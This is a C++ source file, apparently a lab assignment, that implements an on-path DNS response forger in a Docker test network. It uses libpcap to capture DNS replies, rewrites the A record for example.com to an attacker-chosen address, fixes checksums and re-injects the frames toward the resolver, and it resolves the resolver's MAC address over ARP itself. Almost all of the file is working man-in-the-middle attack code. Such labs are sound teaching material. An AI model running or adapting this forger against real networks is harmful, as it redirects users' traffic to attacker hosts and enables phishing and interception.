// interceptor.cpp — Phase 2 on-path DNS response forger
//
// Pure libpcap capture + injection. No netfilter_queue, no raw sockets for
// sending — everything goes through pcap_open_live()/pcap_loop() to capture
// and pcap_inject() to send, as the assignment requires.
//
// Why this design (and not NFQUEUE):
//   core-router is given a diversion route (see core-router/entrypoint.sh):
//       ip route replace 172.16.2.10/32 via 172.16.2.100
//   so a DNS reply travelling core-router -> resolver arrives here
//   Ethernet-addressed to OUR MAC, while its IP destination is still
//   172.16.2.10 (the resolver). If ip_forward were left on, the kernel
//   would silently forward that frame on its own, and this program would
//   never see it — which is exactly what was happening before. We turn
//   ip_forward OFF (see entrypoint.sh) so every one of these frames MUST
//   pass through this program. We act as the "router hop": capture the
//   frame, optionally rewrite the DNS answer, re-stamp the Ethernet
//   header, and inject it back out toward the resolver ourselves.

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>
#include <string>
#include <vector>

static const char* IFACE_DEFAULT  = "eth0";
static const char* RESOLVER_IP    = "172.16.2.10";
static const char* REPLACEMENT_IP = "172.16.1.30";
static const int   ETH_HDR_LEN    = 14;

// ---------------------------------------------------------------------
// DNS parsing / rewriting (unchanged logic from the original draft —
// this part was already correct, it's the plumbing around it that wasn't)
// ---------------------------------------------------------------------

static uint16_t checksum(const unsigned char* data, size_t len) {
    uint32_t sum = 0;
    while (len >= 2) {
        sum += (static_cast<uint16_t>(data[0]) << 8) | data[1];
        data += 2;
        len -= 2;
    }
    if (len) sum += static_cast<uint16_t>(data[0]) << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

static uint16_t read_u16(const unsigned char* p) {
    return (static_cast<uint16_t>(p[0]) << 8) | p[1];
}
static void write_u16(unsigned char* p, uint16_t value) {
    p[0] = static_cast<unsigned char>(value >> 8);
    p[1] = static_cast<unsigned char>(value & 0xff);
}

// Skip a DNS name, including compressed names. 'pos' advances past the name.
static bool skip_dns_name(const unsigned char* dns, size_t len, size_t& pos) {
    while (pos < len) {
        unsigned char n = dns[pos];
        if (n == 0) { ++pos; return true; }
        if ((n & 0xc0) == 0xc0) {
            if (pos + 1 >= len) return false;
            pos += 2;
            return true;
        }
        if (n & 0xc0) return false;
        ++pos;
        if (pos + n > len) return false;
        pos += n;
    }
    return false;
}

static bool is_target_response(const unsigned char* dns, size_t len) {
    if (!dns || len < 12) return false;

    uint16_t flags   = read_u16(dns + 2);
    uint16_t qdcount = read_u16(dns + 4);
    uint16_t ancount = read_u16(dns + 6);
    if (!(flags & 0x8000) || qdcount != 1 || ancount == 0) return false;

    size_t pos = 12;
    std::string name;
    while (pos < len) {
        unsigned char label_len = dns[pos++];
        if (label_len == 0) break;
        if ((label_len & 0xc0) != 0 || pos + label_len > len) return false;
        if (!name.empty()) name += '.';
        for (size_t i = 0; i < label_len; ++i) {
            char c = static_cast<char>(dns[pos + i]);
            if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
            name += c;
        }
        pos += label_len;
    }
    if (pos + 4 > len) return false;
    uint16_t qtype  = read_u16(dns + pos);
    uint16_t qclass = read_u16(dns + pos + 2);
    if (name != "example.com" || qtype != 1 || qclass != 1) return false;

    // Confirm the answer section contains at least one IN/A record.
    pos += 4;
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type  = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) return true;
        pos += rdlen;
    }
    return false;
}

static bool rewrite_dns_answer(unsigned char* dns, size_t len) {
    if (!is_target_response(dns, len)) return false;

    size_t pos = 12;
    if (!skip_dns_name(dns, len, pos) || pos + 4 > len) return false;
    pos += 4; // QTYPE + QCLASS

    unsigned char replacement[4];
    if (inet_pton(AF_INET, REPLACEMENT_IP, replacement) != 1) return false;

    uint16_t ancount = read_u16(dns + 6);
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type  = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) {
            std::memcpy(dns + pos, replacement, 4);
            return true;
        }
        pos += rdlen;
    }
    return false;
}

static void recalc_checksums(unsigned char* ip_pkt, size_t ip_len, size_t udp_len) {
    // IPv4 header checksum.
    ip_pkt[10] = ip_pkt[11] = 0;
    write_u16(ip_pkt + 10, checksum(ip_pkt, ip_len));

    // UDP checksum uses the IPv4 pseudo-header.
    unsigned char* udp = ip_pkt + ip_len;
    udp[6] = udp[7] = 0;
    std::vector<unsigned char> pseudo(12 + udp_len, 0);
    std::memcpy(pseudo.data(), ip_pkt + 12, 8); // source + destination IP
    pseudo[9] = IPPROTO_UDP;
    write_u16(pseudo.data() + 10, static_cast<uint16_t>(udp_len));
    std::memcpy(pseudo.data() + 12, udp, udp_len);
    uint16_t udp_sum = checksum(pseudo.data(), pseudo.size());
    if (udp_sum == 0) udp_sum = 0xffff;
    write_u16(udp + 6, udp_sum);
}

// ---------------------------------------------------------------------
// L2 plumbing: our own MAC, and ARP resolution for the resolver's MAC.
// Both over the SAME pcap handle we already have open — no raw sockets.
// ---------------------------------------------------------------------

static bool get_own_mac(const std::string& iface, unsigned char mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    bool ok = ioctl(fd, SIOCGIFHWADDR, &ifr) == 0;
    if (ok) std::memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return ok;
}

static bool arp_resolve(pcap_t* handle, const unsigned char own_mac[6],
                         const char* own_ip, const char* target_ip,
                         unsigned char out_mac[6]) {
    unsigned char frame[60] = {0};
    std::memset(frame, 0xff, 6);        // Ethernet dst: broadcast
    std::memcpy(frame + 6, own_mac, 6); // Ethernet src: us
    write_u16(frame + 12, ETHERTYPE_ARP);

    unsigned char* arp = frame + ETH_HDR_LEN;
    write_u16(arp + 0, 1);      // hw type: Ethernet
    write_u16(arp + 2, 0x0800); // proto type: IPv4
    arp[4] = 6; arp[5] = 4;     // hw/proto size
    write_u16(arp + 6, 1);      // opcode: request
    std::memcpy(arp + 8, own_mac, 6);
    inet_pton(AF_INET, own_ip, arp + 14);
    std::memset(arp + 18, 0x00, 6);
    inet_pton(AF_INET, target_ip, arp + 24);

    unsigned char want_ip[4];
    inet_pton(AF_INET, target_ip, want_ip);

    for (int attempt = 0; attempt < 5; ++attempt) {
        if (pcap_inject(handle, frame, sizeof(frame)) < 0) return false;

        struct pcap_pkthdr* hdr;
        const unsigned char* pkt;
        time_t deadline = time(nullptr) + 1;
        while (time(nullptr) < deadline) {
            int rc = pcap_next_ex(handle, &hdr, &pkt);
            if (rc != 1) continue;
            if (hdr->caplen < ETH_HDR_LEN + 28) continue;
            if (read_u16(pkt + 12) != ETHERTYPE_ARP) continue;
            const unsigned char* reply_arp = pkt + ETH_HDR_LEN;
            if (read_u16(reply_arp + 6) != 2) continue; // opcode: reply
            if (std::memcmp(reply_arp + 14, want_ip, 4) == 0) {
                std::memcpy(out_mac, reply_arp + 8, 6);
                return true;
            }
        }
    }
    return false;
}

// ---------------------------------------------------------------------
// The relay itself.
// ---------------------------------------------------------------------

struct RelayState {
    unsigned char own_mac[6];
    unsigned char resolver_mac[6];
    pcap_t* handle;
    bool forge;
};

static void handle_packet(unsigned char* user, const struct pcap_pkthdr* hdr,
                           const unsigned char* bytes) {
    auto* st = reinterpret_cast<RelayState*>(user);
    if (hdr->caplen < ETH_HDR_LEN + sizeof(iphdr)) return;

    // Ignore frames we injected ourselves.
    if (std::memcmp(bytes + 6, st->own_mac, 6) == 0) return;

    if (read_u16(bytes + 12) != ETHERTYPE_IP) return; // skip ARP etc.

    std::vector<unsigned char> frame(bytes, bytes + hdr->caplen);
    unsigned char* ip_pkt = frame.data() + ETH_HDR_LEN;
    auto* ip = reinterpret_cast<iphdr*>(ip_pkt);
    if (ip->version != 4 || ip->protocol != IPPROTO_UDP) return;

    size_t ip_len = static_cast<size_t>(ip->ihl) * 4;
    size_t remaining = frame.size() - ETH_HDR_LEN;
    if (remaining < ip_len + sizeof(udphdr)) return;

    auto* udp = reinterpret_cast<udphdr*>(ip_pkt + ip_len);
    size_t udp_len = ntohs(udp->len);
    if (ntohs(udp->source) != 53) return;
    if (udp_len < sizeof(udphdr) + 12 || ip_len + udp_len > remaining) return;

    unsigned char* dns = ip_pkt + ip_len + sizeof(udphdr);
    size_t dns_len = udp_len - sizeof(udphdr);

    bool rewritten = false;
    if (st->forge) {
        rewritten = rewrite_dns_answer(dns, dns_len);
    }
    // Always finalize checksums before injecting, even when the payload is
    // untouched. Docker's veth links defer UDP/IP checksum computation
    // (CHECKSUM_PARTIAL) for packets delivered kernel-to-kernel; what
    // libpcap captures can carry a stale/zero placeholder that was never
    // meant to be checked. Re-injecting that frame makes it look like it
    // just arrived off the wire, so the resolver's kernel validates it in
    // software and silently drops anything with an invalid checksum
    // before BIND ever sees it — exactly the "relayed but never received"
    // symptom. Recomputing for every packet removes that failure mode.
    recalc_checksums(ip_pkt, ip_len, udp_len);

    // Re-address at L2 and put it back on the wire toward the resolver.
    // This happens for EVERY packet that reaches us, forged or not —
    // that's what keeps non-target lookups relaying transparently.
    std::memcpy(frame.data() + 0, st->resolver_mac, 6);
    std::memcpy(frame.data() + 6, st->own_mac, 6);
    pcap_inject(st->handle, frame.data(), frame.size());

    char src[INET_ADDRSTRLEN], dst[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, ip_pkt + 12, src, sizeof(src));
    inet_ntop(AF_INET, ip_pkt + 16, dst, sizeof(dst));
    if (rewritten) {
        std::cout << "[DNS match] example.com A response " << src << " -> " << dst
                  << "; answer changed to " << REPLACEMENT_IP << std::endl;
    } else {
        std::cout << "[relay] " << src << " -> " << dst << " (unchanged)" << std::endl;
    }
}

int main(int argc, char** argv) {
    std::string mode = (argc > 1) ? argv[1] : "normal";
    bool forge = (mode == "intercept");

    const char* iface_env = std::getenv("IFACE");
    std::string iface = iface_env ? iface_env : IFACE_DEFAULT;
    const char* own_ip_env = std::getenv("ATTACKER_IP");
    std::string own_ip = own_ip_env ? own_ip_env : "172.16.2.100";

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface.c_str(), 65536, /*promisc=*/1, 100, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << iface << "): " << errbuf << std::endl;
        return 1;
    }

    struct bpf_program fp;
    const char* filter = "arp or (udp and src port 53)";
    if (pcap_compile(handle, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        std::cerr << "Failed to set BPF filter: " << pcap_geterr(handle) << std::endl;
        return 1;
    }
    pcap_freecode(&fp);

    RelayState st{};
    if (!get_own_mac(iface, st.own_mac)) {
        std::cerr << "Could not read our own MAC on " << iface << std::endl;
        return 1;
    }
    std::cout << "[interceptor] mode=" << mode << " iface=" << iface
              << " forge=" << (forge ? "on" : "off") << std::endl;

    if (!arp_resolve(handle, st.own_mac, own_ip.c_str(), RESOLVER_IP, st.resolver_mac)) {
        std::cerr << "ARP resolution for resolver " << RESOLVER_IP << " failed" << std::endl;
        return 1;
    }
    std::printf("[interceptor] resolver %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
                RESOLVER_IP, st.resolver_mac[0], st.resolver_mac[1], st.resolver_mac[2],
                st.resolver_mac[3], st.resolver_mac[4], st.resolver_mac[5]);

    st.handle = handle;
    st.forge = forge;

    pcap_loop(handle, -1, handle_packet, reinterpret_cast<unsigned char*>(&st));

    pcap_close(handle);
    return 0;
}
